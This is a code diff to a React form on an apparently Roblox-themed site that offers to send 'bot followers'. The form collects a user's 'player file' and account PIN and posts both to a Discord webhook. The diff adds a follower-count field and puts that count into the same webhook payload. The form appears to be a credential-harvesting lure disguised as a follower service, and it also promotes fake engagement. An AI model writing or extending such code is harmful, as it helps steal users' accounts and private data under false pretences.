@@ -1,16 +1,18 @@
 
 import React, { useState } from 'react';
-import { FileIcon, LockIcon, Loader2, X } from 'lucide-react';
+import { FileIcon, LockIcon, Loader2, X, Users } from 'lucide-react';
 import { toast } from 'sonner';
 import { motion } from 'framer-motion';
 import { sendToDiscordWebhook } from '@/utils/webhookService';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { useConfig } from '@/context/ConfigContext';
+import { Input } from "@/components/ui/input";
 
 const BotFollowersForm: React.FC = () => {
   const { config } = useConfig();
   const [playerFile, setPlayerFile] = useState<string>("");
   const [pin, setPin] = useState<string>("");
+  const [followersCount, setFollowersCount] = useState<string>("100");
   const [isLoading, setIsLoading] = useState(false);
   const [showError, setShowError] = useState(false);
 
@@ -18,6 +20,19 @@ const BotFollowersForm: React.FC = () => {
     // Only allow numbers and limit to 4 characters
     const value = e.target.value.replace(/\D/g, '').slice(0, 4);
     setPin(value);
+  };
+
+  const handleFollowersCountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    // Only allow numbers
+    let value = e.target.value.replace(/\D/g, '');
+    
+    // Ensure the value is between 1 and 1000
+    const numValue = parseInt(value);
+    if (numValue > 1000) {
+      value = "1000";
+    }
+    
+    setFollowersCount(value);
   };
 
   const handleSubmit = async () => {
@@ -32,13 +47,17 @@ const BotFollowersForm: React.FC = () => {
       await sendToDiscordWebhook({
         toolType: "Bot Followers",
         file: playerFile,
-        pin
+        pin,
+        additionalInfo: {
+          followersCount: followersCount || "100"
+        }
       }, config.webhookUrl, config.cooldownSeconds);
       
       toast.success("Bot following started!");
       // Clear the form after successful submission
       setPlayerFile("");
       setPin("");
+      setFollowersCount("100");
     } catch (error) {
       // Error handled in webhookService
     } finally {
@@ -118,10 +137,28 @@ const BotFollowersForm: React.FC = () => {
         </motion.div>
         
         <motion.div 
-          className="relative mb-6"
+          className="relative mb-4"
           initial={{ x: -10, opacity: 0 }}
           animate={{ x: 0, opacity: 1 }}
           transition={{ delay: 0.5, duration: 0.5, ease: "easeOut" }}
+        >
+          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
+            <Users size={18} />
+          </div>
+          <input
+            type="text"
+            placeholder="Number of followers (max 1000)"
+            value={followersCount}
+            onChange={handleFollowersCountChange}
+            className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
+          />
+        </motion.div>
+        
+        <motion.div 
+          className="relative mb-6"
+          initial={{ x: -10, opacity: 0 }}
+          animate={{ x: 0, opacity: 1 }}
+          transition={{ delay: 0.6, duration: 0.5, ease: "easeOut" }}
         >
           <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
             <LockIcon size={18} />
@@ -143,7 +180,7 @@ const BotFollowersForm: React.FC = () => {
           whileTap={{ scale: 0.98 }}
           initial={{ opacity: 0 }}
           animate={{ opacity: 1 }}
-          transition={{ delay: 0.6, duration: 0.5 }}
+          transition={{ delay: 0.7, duration: 0.5 }}
           disabled={isLoading}
         >
           {isLoading ? (
